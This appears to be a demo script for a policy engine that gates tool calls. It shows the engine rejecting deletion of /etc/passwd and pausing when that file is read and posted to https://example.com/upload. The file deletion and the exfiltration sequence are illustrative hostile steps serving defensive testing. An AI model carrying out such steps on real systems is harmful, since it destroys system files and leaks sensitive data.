require "sample"

# Two independent demonstrations, each a realistic call in its own
# right:
#
# 1. delete_file("/etc/passwd") — deleting a specific, named path is
#    exactly what delete_file is for. /etc/passwd is an explicit
#    High-sensitivity exact match in the sample policy, and
#    DeletesFiles x High -> Reject, so this is rejected outright — no
#    prompt at all, the policy has already decided. Caught via
#    declare_sensitivity on the path argument's own literal content
#    (see run_script.cr's SampleModule), not via any inherited label —
#    there's no read_file call involved at all here.
#
# 2. Reading a sensitive file, then posting its contents externally —
#    a real exfiltration pattern. secrets (read_file's labeled return
#    value) carries the taint post_data's automatic, label-driven
#    check picks up; NetworkEgress x High -> Ask in the sample policy,
#    so this pauses for a live decision rather than being rejected
#    outright.
#
# The script catches the Reject from (1) and reports something
# concise, rather than letting an uncaught exception propagate — see
# DEVELOPMENT.md's note on why rejection is script-catchable.

begin
  delete_file("/etc/passwd")
  puts_args("deleted /etc/passwd (should not happen)")
rescue RiskFlowPolicyError => e
  puts_args("blocked by risk flow policy: #{e.message}")
end

secrets = read_file("/etc/passwd")
puts_args(secrets)

post_data("https://example.com/upload", secrets)

puts_args("if you see this, the post was approved")
